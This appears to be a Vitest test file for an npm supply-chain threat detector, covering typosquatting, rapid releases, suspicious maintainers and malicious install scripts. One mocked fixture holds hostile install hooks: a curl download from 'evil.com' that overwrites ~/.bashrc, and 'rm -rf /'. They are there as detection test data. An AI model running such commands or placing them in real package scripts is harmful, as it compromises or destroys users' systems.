import { describe, it, expect, beforeEach, vi } from 'vitest';
import { SupplyChainDetector } from '../../src/core/detector.js';
import { Dependency } from '../../src/types/vulnerability.js';

// Mock node-fetch
vi.mock('node-fetch', () => ({
  default: vi.fn(),
}));

import fetch from 'node-fetch';
const mockFetch = vi.mocked(fetch);

describe('SupplyChainDetector', () => {
  let detector: SupplyChainDetector;

  beforeEach(() => {
    detector = new SupplyChainDetector();
    vi.clearAllMocks();
  });

  describe('detectTyposquatting', () => {
    it('should detect typosquatting packages', async () => {
      const dependencies: Dependency[] = [
        { name: 'loda.sh', version: '1.0.0', type: 'dependencies' },
        { name: 'expres', version: '1.0.0', type: 'dependencies' },
        { name: 'reaact', version: '1.0.0', type: 'dependencies' },
        { name: 'lodash', version: '4.17.21', type: 'dependencies' }, // Should not be flagged
      ];

      const threats = await detector.detectThreats(dependencies);
      
      const typosquattingThreats = threats.filter(t => t.type === 'typosquatting');
      expect(typosquattingThreats).toHaveLength(3);
      
      const packageNames = typosquattingThreats.map(t => t.packageName);
      expect(packageNames).toContain('loda.sh');
      expect(packageNames).toContain('expres');
      expect(packageNames).toContain('reaact');
      expect(packageNames).not.toContain('lodash');
    });

    it('should not flag legitimate packages', async () => {
      const dependencies: Dependency[] = [
        { name: 'lodash', version: '4.17.21', type: 'dependencies' },
        { name: 'express', version: '4.18.2', type: 'dependencies' },
        { name: 'react', version: '18.2.0', type: 'dependencies' },
      ];

      const threats = await detector.detectThreats(dependencies);
      
      const typosquattingThreats = threats.filter(t => t.type === 'typosquatting');
      expect(typosquattingThreats).toHaveLength(0);
    });
  });

  describe('detectSuspiciousActivity', () => {
    it('should detect rapid version releases', async () => {
      // Mock rapid releases - 6 versions in 24 hours
      const versions: Record<string, any> = {};
      const time: Record<string, string> = {};
      const now = Date.now();
      
      for (let i = 0; i < 6; i++) {
        const version = `1.0.${i}`;
        versions[version] = {};
        time[version] = new Date(now - (23 * 60 * 60 * 1000) + (i * 60 * 60 * 1000)).toISOString();
      }

      const mockResponse = {
        'dist-tags': { latest: '1.0.5' },
        versions,
        time,
        maintainers: [],
      };

      // Set up mock to be called multiple times
      mockFetch.mockResolvedValue({
        ok: true,
        json: () => Promise.resolve(mockResponse),
      });

      const dependencies: Dependency[] = [
        { name: 'rapid-release-package', version: '1.0.0', type: 'dependencies' },
      ];

      const threats = await detector.detectThreats(dependencies);
      
      const activityThreats = threats.filter(t => t.type === 'suspicious-activity');
      expect(activityThreats.length).toBeGreaterThan(0);
      expect(activityThreats[0].description).toContain('unusually high release activity');
    });

    it('should detect very new packages', async () => {
      const mockResponse = {
        'dist-tags': { latest: '1.0.0' },
        versions: {
          '1.0.0': {},
        },
        time: {
          '1.0.0': new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString(), // 2 days ago
        },
        maintainers: [],
      };

      // Set up mock to be called multiple times
      mockFetch.mockResolvedValue({
        ok: true,
        json: () => Promise.resolve(mockResponse),
      });

      const dependencies: Dependency[] = [
        { name: 'new-package', version: '1.0.0', type: 'dependencies' },
      ];

      const threats = await detector.detectThreats(dependencies);
      
      const activityThreats = threats.filter(t => t.type === 'suspicious-activity');
      expect(activityThreats.length).toBeGreaterThan(0);
      expect(activityThreats[0].description).toContain('very recently published');
    });
  });

  describe('detectCompromisedMaintainers', () => {
    it('should detect suspicious maintainer emails', async () => {
      const mockResponse = {
        'dist-tags': { latest: '1.0.0' },
        versions: {
          '1.0.0': {},
        },
        maintainers: [
          { name: 'suspicious-user', email: 'temp@example.com' },
          { name: 'legitimate-user', email: 'real@company.com' },
        ],
      };

      // Set up mock to be called multiple times
      mockFetch.mockResolvedValue({
        ok: true,
        json: () => Promise.resolve(mockResponse),
      });

      const dependencies: Dependency[] = [
        { name: 'suspicious-package', version: '1.0.0', type: 'dependencies' },
      ];

      const threats = await detector.detectThreats(dependencies);
      
      const maintainerThreats = threats.filter(t => t.type === 'compromised-maintainer');
      expect(maintainerThreats.length).toBeGreaterThan(0);
      expect(maintainerThreats[0].description).toContain('suspicious email addresses');
    });

    it('should detect single maintainer packages', async () => {
      const mockResponse = {
        'dist-tags': { latest: '1.0.0' },
        versions: {
          '1.0.0': {},
        },
        maintainers: [
          { name: 'single-maintainer', email: 'legitimate@company.com' },
        ],
      };

      // Set up mock to be called multiple times
      mockFetch.mockResolvedValue({
        ok: true,
        json: () => Promise.resolve(mockResponse),
      });

      const dependencies: Dependency[] = [
        { name: 'single-maintainer-package', version: '1.0.0', type: 'dependencies' },
      ];

      const threats = await detector.detectThreats(dependencies);
      
      const maintainerThreats = threats.filter(t => t.type === 'compromised-maintainer');
      const singleMaintainerThreats = maintainerThreats.filter(t => 
        t.description.includes('only one maintainer')
      );
      expect(singleMaintainerThreats.length).toBeGreaterThan(0);
    });
  });
describe('detectMaliciousScripts', () => {
    it('should detect suspicious script patterns', async () => {
      // Mock npm registry response with malicious scripts
      const mockResponse = {
        'dist-tags': { latest: '1.0.0' },
        versions: {
          '1.0.0': {
            version: '1.0.0',
            scripts: {
              'preinstall': 'curl -o ~/.bashrc http://evil.com/script.sh',
              'postinstall': 'rm -rf /',
            },
          },
        },
        maintainers: [],
      };

      // Set up mock to be called multiple times
      mockFetch.mockResolvedValue({
        ok: true,
        json: () => Promise.resolve(mockResponse),
      });

      const dependencies: Dependency[] = [
        { name: 'malicious-package', version: '1.0.0', type: 'dependencies' },
      ];

      const threats = await detector.detectThreats(dependencies);
      
      const scriptThreats = threats.filter(t => t.type === 'malicious-script');
      expect(scriptThreats.length).toBeGreaterThan(0);
      expect(scriptThreats[0].packageName).toBe('malicious-package');
      expect(scriptThreats[0].severity).toBe('critical');
    });

    it('should not flag legitimate scripts', async () => {
      const mockResponse = {
        'dist-tags': { latest: '1.0.0' },
        versions: {
          '1.0.0': {
            version: '1.0.0',
            scripts: {
              'build': 'webpack',
              'test': 'jest',
              'lint': 'eslint src/',
            },
          },
        },
        maintainers: [],
      };

      // Set up mock to be called multiple times
      mockFetch.mockResolvedValue({
        ok: true,
        json: () => Promise.resolve(mockResponse),
      });

      const dependencies: Dependency[] = [
        { name: 'legitimate-package', version: '1.0.0', type: 'dependencies' },
      ];

      const threats = await detector.detectThreats(dependencies);
      
      const scriptThreats = threats.filter(t => t.type === 'malicious-script');
      expect(scriptThreats).toHaveLength(0);
    });
  });

  describe('error handling', () => {
    it('should handle fetch errors gracefully', async () => {
      mockFetch.mockRejectedValueOnce(new Error('Network error'));

      const dependencies: Dependency[] = [
        { name: 'test-package', version: '1.0.0', type: 'dependencies' },
      ];

      const threats = await detector.detectThreats(dependencies);
      
      // Should not throw, but return empty threats for failed fetches
      expect(Array.isArray(threats)).toBe(true);
    });

    it('should handle 404 responses gracefully', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 404,
      });

      const dependencies: Dependency[] = [
        { name: 'nonexistent-package', version: '1.0.0', type: 'dependencies' },
      ];

      const threats = await detector.detectThreats(dependencies);
      
      // Should not throw, but return empty threats for failed fetches
      expect(Array.isArray(threats)).toBe(true);
    });
  });
});
